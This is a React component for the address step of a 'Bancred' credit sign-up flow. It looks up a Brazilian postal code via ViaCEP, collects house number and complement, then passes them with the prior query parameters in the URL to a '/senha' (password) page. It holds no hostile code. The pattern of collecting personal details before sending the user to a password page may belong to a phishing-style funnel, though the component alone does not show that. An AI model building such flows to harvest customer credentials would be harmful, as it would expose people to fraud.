import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { MapPin, Search, Loader2, AlertCircle } from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import ConsultorCard from "@/components/ConsultorCard";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

type EnderecoData = {
  cep: string;
  logradouro: string;
  bairro: string;
  localidade: string;
  uf: string;
};

const formatCep = (v: string) => {
  const d = v.replace(/\D/g, "").slice(0, 8);
  return d.length > 5 ? `${d.slice(0, 5)}-${d.slice(5)}` : d;
};

const inputStyle: React.CSSProperties = {
  width: "100%",
  padding: "14px 16px",
  border: "1.5px solid #E5E7EB",
  borderRadius: 12,
  fontSize: 16,
  outline: "none",
  boxSizing: "border-box",
  background: "#FFFFFF",
  color: "#111827",
  fontFamily: fontStack,
  minHeight: 50,
  WebkitAppearance: "none",
};

const Endereco = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();

  const [step, setStep] = useState<1 | 2>(1);
  const [cep, setCep] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [endereco, setEndereco] = useState<EnderecoData | null>(null);
  const [numero, setNumero] = useState("");
  const [complemento, setComplemento] = useState("");

  const handleBuscar = async (e: React.FormEvent) => {
    e.preventDefault();
    const digits = cep.replace(/\D/g, "");
    if (digits.length !== 8) {
      setError("CEP inválido");
      return;
    }
    setLoading(true);
    setError("");
    try {
      const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
      const data = await res.json();
      if (data.erro) {
        setError("CEP não encontrado");
      } else {
        setEndereco({
          cep: data.cep,
          logradouro: data.logradouro,
          bairro: data.bairro,
          localidade: data.localidade,
          uf: data.uf,
        });
        setStep(2);
      }
    } catch {
      setError("Erro ao buscar CEP. Tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  const handleConfirmar = (e: React.FormEvent) => {
    e.preventDefault();
    if (!numero.trim()) return;
    const qs = new URLSearchParams(params);
    qs.set("cep", endereco?.cep || "");
    qs.set("numero", numero);
    if (complemento) qs.set("complemento", complemento);
    navigate(`/senha?${qs.toString()}`);
  };

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#F4F4F7",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img src={logo} alt="Bancred" style={{ height: 104, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "24px 16px", maxWidth: 480, margin: "0 auto" }}>
        <div style={{ marginBottom: 16 }}>
          <ConsultorCard />
        </div>
        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: step === 1 ? 24 : 22,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
          }}
        >
          {step === 1 ? (
            <>
              <div
                style={{
                  width: 48,
                  height: 48,
                  borderRadius: "50%",
                  background: "#DBEAFE",
                  color: "#1C68E3",
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  marginBottom: 14,
                }}
              >
                <MapPin size={22} />
              </div>
              <h1 style={{ fontSize: 20, fontWeight: 700, marginBottom: 6 }}>
                Onde você quer receber seu carnê?
              </h1>
              <p style={{ fontSize: 13, color: "#6B7280", marginBottom: 22 }}>
                Informe seu endereço para receber o contrato pelos Correios.
              </p>

              <form onSubmit={handleBuscar}>
                <label style={{ display: "block", fontSize: 13, fontWeight: 600, marginBottom: 6 }}>
                  CEP
                </label>
                <input
                  type="tel"
                  inputMode="numeric"
                  placeholder="00000-000"
                  maxLength={9}
                  value={cep}
                  onChange={(e) => {
                    setCep(formatCep(e.target.value));
                    setError("");
                  }}
                  style={{ ...inputStyle, marginBottom: error ? 8 : 18 }}
                />
                {error && (
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 6,
                      color: "#DC2626",
                      fontSize: 13,
                      marginBottom: 14,
                    }}
                  >
                    <AlertCircle size={14} /> {error}
                  </div>
                )}
                <button
                  type="submit"
                  disabled={loading}
                  style={{
                    width: "100%",
                    padding: "15px 20px",
                    background: loading ? "#93C5FD" : "#1C68E3",
                    color: "#fff",
                    border: "none",
                    borderRadius: 14,
                    fontSize: 16,
                    fontWeight: 700,
                    letterSpacing: -0.2,
                    cursor: loading ? "not-allowed" : "pointer",
                    boxShadow: loading ? "none" : "0 8px 24px rgba(28,104,227,0.28)",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                    minHeight: 52,
                  }}
                >
                  {loading ? (
                    <>
                      <Loader2 size={16} className="animate-spin" /> Buscando...
                    </>
                  ) : (
                    <>
                      <Search size={16} /> Buscar endereço
                    </>
                  )}
                </button>
              </form>
            </>
          ) : (
            <>
              <h1 style={{ fontSize: 18, fontWeight: 700, marginBottom: 4 }}>
                Confirme seu endereço
              </h1>
              <p style={{ fontSize: 13, color: "#6B7280", marginBottom: 16 }}>
                Confira os dados e informe o número.
              </p>

              <div
                style={{
                  background: "#F9FAFB",
                  borderRadius: 10,
                  padding: 14,
                  marginBottom: 16,
                  fontSize: 13,
                  color: "#111827",
                  lineHeight: 1.7,
                }}
              >
                <div>
                  <strong style={{ color: "#6B7280", fontWeight: 600 }}>CEP:</strong> {endereco?.cep}
                </div>
                <div>
                  <strong style={{ color: "#6B7280", fontWeight: 600 }}>Rua:</strong> {endereco?.logradouro || "—"}
                </div>
                <div>
                  <strong style={{ color: "#6B7280", fontWeight: 600 }}>Bairro:</strong> {endereco?.bairro || "—"}
                </div>
                <div>
                  <strong style={{ color: "#6B7280", fontWeight: 600 }}>Cidade:</strong>{" "}
                  {endereco?.localidade} - {endereco?.uf}
                </div>
              </div>

              <form onSubmit={handleConfirmar}>
                <label style={{ display: "block", fontSize: 13, fontWeight: 600, marginBottom: 6 }}>
                  Número
                </label>
                <input
                  type="tel"
                  inputMode="numeric"
                  placeholder="Ex: 123"
                  value={numero}
                  onChange={(e) => setNumero(e.target.value.replace(/\D/g, ""))}
                  style={{ ...inputStyle, marginBottom: 12 }}
                />

                <label style={{ display: "block", fontSize: 13, fontWeight: 600, marginBottom: 6 }}>
                  Complemento{" "}
                  <span style={{ color: "#9CA3AF", fontWeight: 400 }}>(opcional)</span>
                </label>
                <input
                  type="text"
                  placeholder="Apto, bloco, casa..."
                  value={complemento}
                  onChange={(e) => setComplemento(e.target.value)}
                  style={{ ...inputStyle, marginBottom: 16 }}
                />

                <button
                  type="submit"
                  disabled={!numero.trim()}
                  style={{
                    width: "100%",
                    padding: "15px 20px",
                    background: numero.trim() ? "#1C68E3" : "#93C5FD",
                    color: "#fff",
                    border: "none",
                    borderRadius: 14,
                    fontSize: 16,
                    fontWeight: 700,
                    letterSpacing: -0.2,
                    cursor: numero.trim() ? "pointer" : "not-allowed",
                    boxShadow: numero.trim() ? "0 8px 24px rgba(28,104,227,0.28)" : "none",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                    minHeight: 52,
                    opacity: numero.trim() ? 1 : 0.7,
                  }}
                >
                  Confirmar endereço
                </button>

                <div style={{ height: 8 }} />

                <button
                  type="button"
                  onClick={() => {
                    setStep(1);
                    setEndereco(null);
                    setNumero("");
                    setComplemento("");
                  }}
                  style={{
                    width: "100%",
                    padding: "12px 18px",
                    background: "#FFFFFF",
                    color: "#111827",
                    border: "1px solid #E5E7EB",
                    borderRadius: 10,
                    fontSize: 14,
                    fontWeight: 600,
                    cursor: "pointer",
                  }}
                >
                  Alterar CEP
                </button>
              </form>
            </>
          )}
        </div>
      </main>
    </div>
  );
};

export default Endereco;
